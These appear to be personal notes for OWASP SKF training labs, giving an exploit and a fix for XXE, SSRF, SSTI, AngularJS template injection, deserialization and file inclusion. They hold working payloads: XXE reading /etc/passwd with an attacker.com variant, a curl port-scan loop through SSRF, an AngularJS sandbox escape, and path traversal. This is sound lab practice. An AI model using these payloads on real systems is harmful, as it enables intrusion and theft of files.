# XXE
## Preparation
docker pull blabla1337/owasp-skf-lab:
docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:
## Exploit
Add entity and bind this to a variable that will be printed:
```<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>```

So if you want to go to an external site, you could just place a path there:
"http://www.attacker.com/text.txt" instead of the file.
## Fix
https://docs.python.org/3/library/xml.dom.pulldom.html
So we add an extra parser.
Add imports:
from xml.sax import make_parser
from xml.sax.handler import feature_external_ges^M
Add parser:                                 
    parser = make_parser()                                
    parser.setFeature(feature_external_ges, False)                
    doc = parseString(request.form['xxe'],parser=parser)^M        


# SSRF
## Exploit
Check for different ports on localhost:
http://127.0.0.1:3306
automated:
in burp right click request and copy as bash script, modify in loop to:
for i in {1..10000} ; do echo $i; curl -i -s -k  -X $'POST' -F url=http://127.0.0.1:${i} $'http://security:5000/check_existence' |grep "is reach" ; done ;
not very pretty but it works...
-> other open port 5432
## Fix
blacklist localhost, so it won't search in its own space


# SSTI
## Exploit
http://localhost:5000/{{1=1}}
and other real exploits from:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
## Fix
Move template to its own file. in /templates directory
```
<!DOCTYPE html>                                                                                                                                                      
<html>                                                                                                                                                                 
<head>                                                                                                                                                                 
                                                                                                                                                                       
<meta charset="utf-8">                                                                                                                                                 
<meta name="viewport" content="width=device-width, initial-scale=1">                                                                                                   
<title>Live demonstrations</title>                                                                                                                                     
                                                                                                                                                                       
<link href="/static/css/bootstrap.min.css" rel="stylesheet">                                                                                                           
<link href="/static/css/datepicker3.css" rel="stylesheet">                                                                                                             
<link href="/static/css/styles.css" rel="stylesheet">                                                                                                                  
                                                                                                                                                                       
<!--Icons-->                                                                                                                                                           
<script src="/static/js/lumino.glyphs.js"></script>                                                                                                                    
                                                                                                                                                                       
</head>                                                                                                                                                                
                                                                                                                                                                       
<body>                                                                                                                                                                 
        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">                                                                                         
                <div class="container-fluid">                                                                                                                          
                        <div class="navbar-header">                                                                                                                    
                                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#sidebar-collapse">                          
                                        <span class="sr-only">Toggle navigation</span>                                                                                 
                                        <span class="icon-bar"></span>                                                                                                 
                                        <span class="icon-bar"></span>                                                                                                 
                                        <span class="icon-bar"></span>                                                                                                 
                                </button>                                                                                                                              
                                <ul class="user-menu">                                                                                                                 
                                        <li class="dropdown pull-right">                                                                                               
                                                                                                                                                                       
                                                <ul class="dropdown-menu" role="menu">                                                                                 
                                                </ul>                                                                                                                  
                                        </li>                                                                                                                          
                                </ul>                                                                                                                                  
                        </div>                                                                                                                                         
                </div><!-- /.container-fluid -->                                                                                                                       
        </nav>                                                                                                                                                         
                                                                                                                                                                       
        <div id="sidebar-collapse" class="col-sm-3 col-lg-2 sidebar">                                                                                                  
        <br/><br/>                                                                                                                                                     
        <center>                                                                                                                                                       
                <img src="/static/img/logo.svg" width="60%" height="60%"/>                                                                                             
                <br/>                                                                                                                                                  
                <p style="color:#515594; font-size:1.0em;"><a href="https://github.com/blabla1337/skf-flask" style="color:#515594; font-size:1.7em;">OWASP S.K.F.</a></p>
        </center>                                                                                                                                                      
        </div><!--/.sidebar-->                                                                                                                                         
                                                                                                                                                                       
        <div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main">                           
                <div class="row">                                                                       
                                                                                                        
                </div><!--/.row-->                                                                      
                                                                                                                                                                        
                <div class="row">                                                                                                                                      
                        <div class="col-lg-12">                                                                                                                        
                                <h1 class="page-header">Live demonstration!</h1>                                                                                       
                        </div>                                                                                                                                         
                </div><!--/.row-->                                                                                                                                     
                                                                                                                                                                       
                                                                                                                                                                       
                <div class="row">                                                                                                                                      
                        <div class="col-lg-12">                                                                                                                        
                                <div class="panel panel-default">                                                                                                      
                                        <div class="panel-heading">Server side template injection!</div>                                                               
                                        <div class="panel-body">                                                                                                       
                                                <div class="col-md-6">                                                                                                 
                                                        {{ssti}}                                                                                                            
                                </div>                                                                                                                                 
                                                </form>                                                                                                                
                                        </div>                                                                                                                         
                                </div>                                                                                                                                 
                        </div><!-- /.col-->                                                                                                                            
                </div><!-- /.row -->                                                                                                                                   
                                                                                                                                                                       
     <center> <p style="font-size:2em;">   </p></center>                                                                                                               
                                                                                                                                                                       
        </div><!--/.main-->                                                                                                                                            
                                                                                                                                                                       
        <script src="/static/js/jquery-1.11.1.min.js"></script>                                                                                                        
        <script src="/static/js/bootstrap.min.js"></script>                                                                                                            
        <script src="/static/js/chart.min.js"></script>                                                                                                                
        <script src="/static/js/chart-data.js"></script>                                                                                                               
        <script src="/static/js/easypiechart.js"></script>                                                                                                             
        <script src="/static/js/easypiechart-data.js"></script>                                                                                                        
        <script src="/static/js/bootstrap-datepicker.js"></script>                                                                                                     
                                                                                                                                                                       
        </script>                                                                                                                                               
</body>                                                                                                                                                                
                                                                                                        
</html>
```                        
          
```
from flask import Flask, request, url_for, render_template

app = Flask(__name__, static_url_path='/static', static_folder='static')
app.config['DEBUG'] = True


@app.errorhandler(404)
def page_not_found(e):
    return render_template("template.html", ssti=request.url), 404


if __name__ == "__main__":
    app.run(host='0.0.0.0') 
```

but now we might have XSS:
{% autoescape true %}{{ssti}}{% endautoescape %}                                                                                                            


# CSTI
!!! Works in Chrome but exploit won't work in Firefox !!!
## Exploit
vulnerability in angularjs 1.5 for CSTI, see line 137:
https://github.com/tijme/angularjs-csti-scanner/blob/master/acstis/Payloads.py
```
{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}
```
## Fix
{% autoescape true %}{{ssti}}{% endautoescape %}                                                                                                            
TODO: how do you know that autoescape also escapes {{ and other angularJS risky characters?


# Insecure Deserialization
How to recognize it on the wire? Binary format is AC ED 00 05 (05 being the protocol version number)
most exploited one is using commands from Java Apache Common Collection as it's in the classpath most of the time
https://github.com/frohoff/ysoserial

DES-Yaml
## Exploit
TODO
## Fix
TODO


# LFI/RFI
## Exploit
In payload use text/../../../../../../../../etc/passwd
## Fix
whitelist